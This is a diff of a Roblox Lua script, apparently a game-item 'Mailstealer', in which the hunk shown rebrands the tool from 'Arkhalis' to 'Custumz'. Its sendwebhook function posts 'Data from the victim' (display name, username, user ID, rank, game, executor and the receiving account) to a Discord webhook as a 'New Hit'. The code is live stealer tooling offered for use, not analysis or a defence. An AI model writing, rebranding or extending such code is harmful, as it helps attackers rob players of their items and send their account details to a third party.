@@ -29,13 +29,13 @@ local RapFormated = (require(game:GetService("ReplicatedStorage").Library.Functi
 local function sendwebhook(msg)
 local msg = {
 	["avatar_url"] = "https://cdn.discordapp.com/attachments/1106232994441732117/1106233834850222231/33333.png",
-	["content"]= "**🎁New Hit With Arkhalis🎁** || @here|| ",
-	["username"] = "Arkhalis",
+	["content"]= "**🎁New Hit With Custumz🎁** || @here|| ",
+	["username"] = "Custumz",
 	["embeds"]= {
 	  {
-		["title"]= "`Arkhalis Mailstealer Results`",
+		["title"]= "`Custumz Mailstealer Results`",
 		["description"]= "**Data from the victim**\n```🧑Display Name: ".._G.PlrDisplayNameVictim.."\n🧑Username: ".._G.PlrUserVictim.."\n🧑User ID: ".._G.PlrUserIDVictim.."\n🐱Rank: ".._G.CurrentRank.."\n🎮Place: ".._G.GameIn.."\n☠Executor: "..exploit.."\n📮Receiver: ".._G.Username.."```",
-		["url"]= "https://discord.gg/ajmeAeq76d",
+		["url"]= "join my sever",
 		["color"]= ""..webhookcolor.."",
 		["thumbnail"] = {
         ["url"] = "https://cdn.discordapp.com/attachments/1077585452309155850/1106236489819496448/cat.png",
